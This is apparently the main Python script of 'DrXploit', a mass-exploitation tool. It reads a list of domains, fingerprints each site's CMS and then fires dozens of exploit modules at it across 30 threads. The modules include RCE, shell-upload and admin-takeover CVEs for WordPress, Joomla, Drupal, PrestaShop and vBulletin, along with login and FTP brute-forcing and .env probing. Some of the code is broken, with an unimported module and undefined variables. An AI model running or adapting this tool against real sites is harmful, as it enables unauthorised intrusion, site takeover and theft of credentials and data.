import argparse
import os
import sys
import time
import logging
from concurrent.futures import ThreadPoolExecutor
from core import ensure_directories_exist, read_domains_from_file, Rez
from rich.console import Console
from datetime import datetime
from tools.cms import DetectCMS
from tools import Sqli
from rich.progress import Progress

# Importing exploit modules
from exploits import (
    Presta_1attributewizardpro, Presta_advancedslider, Presta_attributewizardpro,
    Presta_attributewizardpro3, Presta_attributewizardpro_x, Presta_cartabandonmentpro,
    Presta_columnadverts, Presta_fieldvmegamenu, Presta_homepageadvertise, Presta_homepageadvertise2,
    Presta_jro_homepageadvertise, Presta_lib, Presta_megamenu, Presta_nvn_export_orders,
    Presta_pk_flexmenu, Presta_productpageadverts, Presta_psmodthemeoptionpanel, Presta_simpleslideshow,
    Presta_soopabanners, Presta_soopamobile, Presta_tdpsthemeoptionpanel, Presta_videostab,
    Presta_vtermslideshow, Presta_wdoptionpanel, Presta_wg24themeadministration, cartabandonmentproOld,
    CVE_2008_3362Download_Manager, CVE_2014_4725wysija, CVE_2014_9735_revsliderShell, CVE_2015_1579_revsliderConfig,
    CVE_2015_4455_gravityforms, CVE_2015_4455_gravityformsindex, CVE_2015_5151_revsliderCSS, CVE_2017_16562userpro,
    CVE_2018_19207wp_gdpr_compliance, CVE_2019_9879wp_graphql, formcraft, Headway, pagelinesExploit,
    WooCommerce_ProductAddonsExp, WpCateGory_page_icons, Wp_addblockblocker, wp_barclaycart, wp_content_injection,
    wp_eshop_magic, Wp_HD_WebPlayer, Wp_Job_Manager, wp_miniaudioplayer, Wp_pagelines,
    wp_support_plus_responsive_ticket_system, wp_ungallery, WP_User_Frontend, viral_optinsExploit,
    CVE_2019_9978SocialWarfare, WPJekyll_Exporter, Wp_cloudflare, Wprealia, Wpwoocommercesoftware,
    Wp_enfold_child, Wp_contabileads, Wp_prh_api, Wp_dzs_videogallery, Wp_mmplugin, wpinstall,
    Com_alberghi, Com_CCkJseblod, Com_extplorer, Com_Fabric, Com_FoxContent, Com_b2jcontact, Com_bt_portfolio,
    Com_civicrm, Com_jwallpapers, Com_oziogallery, Com_redmystic, Com_simplephotogallery, megamenu,
    mod_simplefileuploadv1, Com_facileforms, Com_Hdflvplayer, Com_Jbcatalog, Com_JCE, com_jdownloads, Com_JCEindex,
    Com_Joomanager, Com_Macgallery, com_media, Com_Myblog, Com_rokdownloads, Com_s5_media_player,
    Com_SexyContactform, CVE_2015_8562RCEjoomla, CVE_2015_8562RCEjoomla2019, CVE_2016_9838TakeAdminJoomla,
    CVE_2014_3704Drupal_add_Admin, CVE_2018_7600Drupalgeddon2, CVE_2019_6340Drupal8RESTful, Drupal_mailchimp,
    phpcurlclass, osCommerce, CVE_2019_16759vBulletinRCE, CVE_2006_2529fckeditor, phpunit, env
)

from BruteForce import Wordpress, FTPBruteForce, Joomla, Drupal, Opencart

console = Console()
domains = []
d_or_p = True

def list_result_files():
    result_dir = os.path.join(os.path.dirname(__file__), 'result')
    if not os.path.exists(result_dir):
        console.print(f"[[red]-[/]] Directory '{result_dir}' does not exist.")
        return
    files = os.listdir(result_dir)
    if not files:
        console.print("[[blue]-[/]] No files found in the 'result' directory.")
        return
    console.print(f"[green]+[/] Result in '{result_dir}':")
    for file in files:
        console.print("[[green]+[/]]", file)

def list_cms_files():
    cms_dir = os.path.join(os.path.dirname(__file__), 'cms')
    if not os.path.exists(cms_dir):
        console.print(f"[[red]-[/]] Directory '{cms_dir}' does not exist.")
        return
    files = os.listdir(cms_dir)
    if not files:
        console.print("[[blue]-[/]] No files found in the 'cms' directory.")
        return
    console.print(f"[green]+[/] Files in '{cms_dir}':")
    for file in files:
        console.print("[[green]+[/]]", file)

def validate_path_or_domain(path_or_domain):
    if os.path.isfile(path_or_domain):
        return 'Path'
    else:
        return 'Domain'

def get_Typer():
    parser = argparse.ArgumentParser(description="DrXploit", add_help=False)
    parser.add_argument("path_or_domain", nargs="?", default=None, help="List For Sites or a single domain")
    parser.add_argument(
        "-h", "--help", dest="help", action="store_true", help="help menu"
    )
    parser.add_argument(
        "-l", "--list-files", dest="list_files", action="store_true", help="List files in result directory"
    )
    parser.add_argument(
        "-c", "--list-cms", dest="list_cms", action="store_true", help="List files in cms directory"
    )
    parser.add_argument(
        "-e", "--email", dest="email", help="Email address for receiving important data"
    )

    args = parser.parse_args()

    if args.help:
        parser.print_help()
        sys.exit()

    if args.list_files:
        list_result_files()
        sys.exit()

    if args.list_cms:
        list_cms_files()
        sys.exit()

    

    if args.email:
        email = args.email
        with open('email.txt', 'w') as f:
            f.write(email)
        console.print(f"[[green]+[/]] The Email {email} has been added successfully.")
        sys.exit()

    if not args.path_or_domain:
        parser.print_help()
        sys.exit()

    logging.basicConfig(level=logging.INFO, format="%(levelname)-8s %(message)s")

    global path
    global YOUR_Email_For_TAkeAdmin_Exploit
    path = args.path_or_domain

def CheckEmail():
    if not os.path.exists('email.txt'):
        console.print("[[red]-[/]] Please provide an email address using the -e option.")
        email = "drdataye@gmail.com"
    else:
        with open('email.txt', 'r') as f:
            email = f.read().strip()
        if not email:
            console.print("[[red]-[/]] Please provide an email address using the -e option.")
            email = "drdataye@gmail.com"
        else:
            console.print(f"[[green]+[/]] Email: {email}", style="bold")

    YOUR_Email_For_TAkeAdmin_Exploit = email


def banner():
    console.print(
        """
    (              )
    )\ )        ( /(             (             )
    (()/(   (    )\())            )\     (   ( /(
    /(_))  )(  ((_)\  (   `  )  ((_) (  )\  )\())
    (_))_  (()\ __((_) )\  /(/(   _   )\((_)(_))/
    |   \  ((_)\ \/ /((_)((_)_\ | | ((_)(_)| |_
    | |) || '_| >  < (_-<| '_ \)| |/ _ \| ||  _|
    |___/ |_|  /_/\_\/__/| .__/ |_|\___/|_| \__|
                        |_|
                                By [link=https://github.com/DrDataYE]@DrDataYE[/]
    """
    )
    console.print("\n-----------------\n", style="bold")
    console.print("[[green]+[/]] DrXsploit v1.0", style="bold")
    console.print("[[green]+[/]] By The [link https://github.com/DrDataYE]@DrDataYE", style="bold")
    console.print("[[green]+[/]] Telegram [link https://t.me/LinuxArabe]@LinuxArabe", style="bold")
    console.print("[[green]+[/]] By Yemen", style="bold")
    console.print("\n-----------------\n", style="bold")
    console.print(
        f"START_TIME: {datetime.now().strftime('%a %b %d %H:%M:%S %Y')}", style="bold"
    )
    console.print(f"[[green]+[/]] {validate_path_or_domain(path)}: {path}", style="bold")
    CheckEmail()
    console.print("\n-----------------\n", style="bold")

    with console.status("[bold green]Wait, loading functions...") as status:
        # headers()
        time.sleep(1)
        status.update("[bold green]Headers loaded, loading user agent...")
        # user_agent()
        time.sleep(1)
        status.update("[bold green]User agent loaded, loading Paths...")
        global domains
        domains = read_domains_from_file(path)
        time.sleep(1)
        status.update("[bold green]All functions loaded successfully!")

start_time = time.time()  # Start time of the script

def MultiThreadScan(site):
    try:
        if site.startswith('http://'):
            site = site.replace('http://', '')
        elif site.startswith("https://"):
            site = site.replace('https://', '')
        else:
            pass
        Check_CMs = DetectCMS(site)
        if Check_CMs == 'wordpress':
            i = CVE_2019_9978SocialWarfare.Exploit(site)
            Rez(site, i)
            i = CVE_2008_3362Download_Manager.Exploit(site)
            Rez(site, i)
            i = CVE_2014_4725wysija.Exploit(site)
            Rez(site, i)
            i = CVE_2014_9735_revsliderShell.Exploit(site)
            Rez(site, i)
            i = CVE_2015_1579_revsliderConfig.Exploit(site)
            Rez(site, i)
            i = CVE_2015_4455_gravityformsindex.Exploit(site)
            Rez(site, i)
            i = CVE_2015_4455_gravityforms.Exploit(site)
            Rez(site, i)
            i = CVE_2015_5151_revsliderCSS.Exploit(site)
            Rez(site, i)
            i = CVE_2017_16562userpro.Exploit(site)
            Rez(site, i)
            i = CVE_2018_19207wp_gdpr_compliance.Exploit(site, YOUR_Email_For_TAkeAdmin_Exploit)
            Rez(site, i)
            i = CVE_2019_9879wp_graphql.Exploit(site, YOUR_Email_For_TAkeAdmin_Exploit)
            Rez(site, i)
            i = formcraft.Exploit(site)
            Rez(site, i)
            i = Wp_contabileads.Exploit(site)
            Rez(site, i)
            i = Wp_prh_api.Exploit(site)
            Rez(site, i)
            i = Wp_mmplugin.Exploit(site)
            Rez(site, i)
            i = Wp_dzs_videogallery.Exploit(site)
            Rez(site, i)
            i = Headway.Exploit(site)
            Rez(site, i)
            i = pagelinesExploit.Exploit(site)
            Rez(site, i)
            i = WooCommerce_ProductAddonsExp.Exploit(site)
            Rez(site, i)
            i = WpCateGory_page_icons.Exploit(site)
            Rez(site, i)
            i = Wp_addblockblocker.Exploit(site)
            Rez(site, i)
            i = wp_barclaycart.Exploit(site)
            Rez(site, i)
            i = wp_content_injection.Exploit(site)
            Rez(site, i)
            i = wp_eshop_magic.Exploit(site)
            Rez(site, i)
            i = WPJekyll_Exporter.Exploit(site)
            Rez(site, i)
            i = Wp_cloudflare.Exploit(site)
            Rez(site, i)
            i = Wprealia.Exploit(site)
            Rez(site, i)
            i = Wpwoocommercesoftware.Exploit(site)
            Rez(site, i)
            i = Wp_enfold_child.Exploit(site)
            Rez(site, i)
            i = Wp_HD_WebPlayer.Exploit(site)
            Rez(site, i)
            i = Wp_Job_Manager.Exploit(site)
            Rez(site, i)
            i = wp_miniaudioplayer.Exploit(site)
            Rez(site, i)
            i = Wp_pagelines.Exploit(site)
            Rez(site, i)
            i = wp_support_plus_responsive_ticket_system.Exploit(site)
            Rez(site, i)
            i = wp_ungallery.Exploit(site)
            Rez(site, i)
            i = WP_User_Frontend.Exploit(site)
            Rez(site, i)
            i = viral_optinsExploit.Exploit(site)
            Rez(site, i)
            i = wpinstall.Exploit(site)
            Rez(site, i)
            i = CVE_2006_2529fckeditor.Exploit(site, 'Wordpress')
            Rez(site, i)
            i = phpunit.Exploit(site, 'Wordpress')
            Rez(site, i)
            mkobj = Wordpress.Wordpress()
            i = mkobj.Run(site)
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
            FTPBruteForce.Exploit(site)
        elif Check_CMs == 'joomla':
            i = CVE_2015_8562RCEjoomla.Exploit(site)
            Rez(site, i)
            i = CVE_2015_8562RCEjoomla2019.exploit(site)
            Rez(site, i)
            i = CVE_2016_9838TakeAdminJoomla.Exploit(site, YOUR_Email_For_TAkeAdmin_Exploit)
            Rez(site, i)
            i = com_jdownloads.Exploit(site)
            Rez(site, i)
            i = Com_FoxContent.Exploit(site)
            Rez(site, i)
            i = Com_b2jcontact.Exploit(site)
            Rez(site, i)
            i = Com_bt_portfolio.Exploit(site)
            Rez(site, i)
            i = Com_civicrm.Exploit(site)
            Rez(site, i)
            i = Com_jwallpapers.Exploit(site)
            Rez(site, i)
            i = Com_oziogallery.Exploit(site)
            Rez(site, i)
            i = Com_redmystic.Exploit(site)
            Rez(site, i)
            i = Com_simplephotogallery.Exploit(site)
            Rez(site, i)
            i = megamenu.Exploit(site)
            Rez(site, i)
            i = mod_simplefileuploadv1.Exploit(site)
            Rez(site, i)
            i = Com_JCE.Exploit(site)
            Rez(site, i)
            i = Com_JCEindex.Exploit(site)
            Rez(site, i)
            i = com_media.Exploit(site)
            Rez(site, i)
            i = Com_Myblog.Exploit(site)
            Rez(site, i)
            i = Com_adsmanager.Exploit(site)
            Rez(site, i)
            i = Com_alberghi.Exploit(site)
            Rez(site, i)
            i = Com_CCkJseblod.Exploit(site)
            Rez(site, i)
            i = Com_extplorer.Exploit(site)
            Rez(site, i)
            i = Com_Fabric.Exploit(site)
            Rez(site, i)
            i = Com_facileforms.Exploit(site)
            Rez(site, i)
            i = Com_Hdflvplayer.Exploit(site)
            Rez(site, i)
            i = Com_Jbcatalog.Exploit(site)
            Rez(site, i)
            i = Com_Joomanager.Exploit(site)
            Rez(site, i)
            i = Com_Macgallery.Exploit(site)
            Rez(site, i)
            i = Com_rokdownloads.Exploit(site)
            Rez(site, i)
            i = Com_s5_media_player.Exploit(site)
            Rez(site, i)
            i = Com_SexyContactform.Exploit(site)
            Rez(site, i)
            i = CVE_2006_2529fckeditor.Exploit(site, 'Joomla')
            Rez(site, i)
            i = phpunit.Exploit(site, 'Joomla')
            Rez(site, i)
            mkobj = Joomla.JooMLaBruteForce()
            i = mkobj.Run(site)
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
        elif Check_CMs == 'drupal':
            i = CVE_2014_3704Drupal_add_Admin.Exploit(site)
            Rez(site, i)
            i = CVE_2018_7600Drupalgeddon2.Exploit(site)
            Rez(site, i)
            i = Drupal_mailchimp.Exploit(site)
            Rez(site, i)
            i = phpcurlclass.Exploit(site)
            Rez(site, i)
            i = CVE_2019_6340Drupal8RESTful.Exploit(site)
            Rez(site, i)
            i = CVE_2006_2529fckeditor.Exploit(site, 'Drupal')
            Rez(site, i)
            i = phpunit.Exploit(site, 'Drupal')
            Rez(site, i)
            mkobj = Drupal.DrupalBruteForce()
            i = mkobj.Run(site)
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
        elif Check_CMs == 'opencart':
            mkobj = Opencart.OpenCart()
            i = phpunit.Exploit(site, 'OpenCart')
            Rez(site, i)
            i = CVE_2006_2529fckeditor.Exploit(site, 'OpenCart')
            Rez(site, i)
            i = mkobj.Run(site)
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
        elif Check_CMs == 'oscommerce':
            i = phpunit.Exploit(site, 'osCommerce')
            Rez(site, i)
            i = osCommerce.Exploit(site)
            Rez(site, i)
            i = CVE_2006_2529fckeditor.Exploit(site, 'osCommerce')
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
        elif Check_CMs == 'vBulletin':
            i = phpunit.Exploit(site, 'vBulletin')
            Rez(site, i)
            i = CVE_2019_16759vBulletinRCE.Exploit(site)
            Rez(site, i)
            i = CVE_2006_2529fckeditor.Exploit(site, 'vBulletin')
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
        elif Check_CMs == 'prestashop':
            i = Presta_1attributewizardpro.Exploit(site)
            Rez(site, i)
            i = Presta_advancedslider.Exploit(site)
            Rez(site, i)
            i = Presta_attributewizardpro.Exploit(site)
            Rez(site, i)
            i = Presta_attributewizardpro3.Exploit(site)
            Rez(site, i)
            i = Presta_attributewizardpro_x.Exploit(site)
            Rez(site, i)
            i = Presta_cartabandonmentpro.Exploit(site)
            Rez(site, i)
            i = Presta_columnadverts.Exploit(site)
            Rez(site, i)
            i = Presta_fieldvmegamenu.Exploit(site)
            Rez(site, i)
            i = Presta_homepageadvertise.Exploit(site)
            Rez(site, i)
            i = Presta_homepageadvertise2.Exploit(site)
            Rez(site, i)
            i = Presta_jro_homepageadvertise.Exploit(site)
            Rez(site, i)
            i = Presta_lib.Exploit(site)
            Rez(site, i)
            i = Presta_megamenu.Exploit(site)
            Rez(site, i)
            i = Presta_nvn_export_orders.Exploit(site)
            Rez(site, i)
            i = Presta_pk_flexmenu.Exploit(site)
            Rez(site, i)
            i = Presta_productpageadverts.Exploit(site)
            Rez(site, i)
            i = Presta_psmodthemeoptionpanel.Exploit(site)
            Rez(site, i)
            i = Presta_simpleslideshow.Exploit(site)
            Rez(site, i)
            i = Presta_soopabanners.Exploit(site)
            Rez(site, i)
            i = Presta_soopamobile.Exploit(site)
            Rez(site, i)
            i = Presta_tdpsthemeoptionpanel.Exploit(site)
            Rez(site, i)
            i = Presta_videostab.Exploit(site)
            Rez(site, i)
            i = Presta_vtermslideshow.Exploit(site)
            Rez(site, i)
            i = Presta_wdoptionpanel.Exploit(site)
            Rez(site, i)
            i = Presta_wg24themeadministration.Exploit(site)
            Rez(site, i)
            i = cartabandonmentproOld.Exploit(site)
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
        elif Check_CMs == 'unknown':
            i = phpunit.Exploit(site, 'unknown')
            Rez(site, i)
            i = CVE_2006_2529fckeditor.Exploit(site, 'unknown')
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
            i = Sqli.Exploit(site)
            Rez(site, i)
        elif Check_CMs == 'deadTarget':
            print(' {}[-] {}{} {}--> {} Timeout!{}'.format(r, w, site, c, y, w))
    except:
        print(' {}[-] {}{} {}--> {} Crashed!{}'.format(r, w, site, c, y, w))

if __name__ == "__main__":
    get_Typer()
    banner()
    ensure_directories_exist()
    try:
        with console.status(
            "[bold white]Finishing Attacks CTRL+C to stop ....."
        ) as status:
            with ThreadPoolExecutor(max_workers=30) as executor:
                results = list(executor.map(MultiThreadScan, domains))
    except KeyboardInterrupt:
        elapsed_time = time.time() - start_time
        console.print("\n\n[[blue]+[/]] Attack stopped by user.", style="bold")
        console.print(f"[[green]+[/]] Elapsed time: {elapsed_time:.2f} seconds", style="bold")

